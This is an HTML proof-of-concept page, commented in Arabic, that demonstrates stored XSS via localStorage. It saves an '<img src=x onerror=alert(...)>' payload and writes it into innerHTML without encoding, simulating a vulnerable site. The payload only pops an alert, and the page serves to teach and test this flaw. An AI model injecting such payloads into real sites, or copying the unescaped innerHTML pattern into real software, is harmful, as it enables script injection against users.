<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PoC - Stored XSS via localStorage</title>
</head>
<body>
  <h2>✅ إذا ظهرت نافذة تنبيه (alert)، فهذا دليل على نجاح تنفيذ XSS.</h2>

  <script>
    // تخزين الحمولة في localStorage
    localStorage.setItem('xss_payload', '<img src=x onerror=alert("🔥 XSS Executed from localStorage")>');

    // استرجاعها وعرضها داخل innerHTML بدون ترميز — هذا يُحاكي السلوك الضعيف في المواقع
    const container = document.createElement('div');
    container.innerHTML = localStorage.getItem('xss_payload');
    document.body.appendChild(container);
  </script>
</body>
</html>
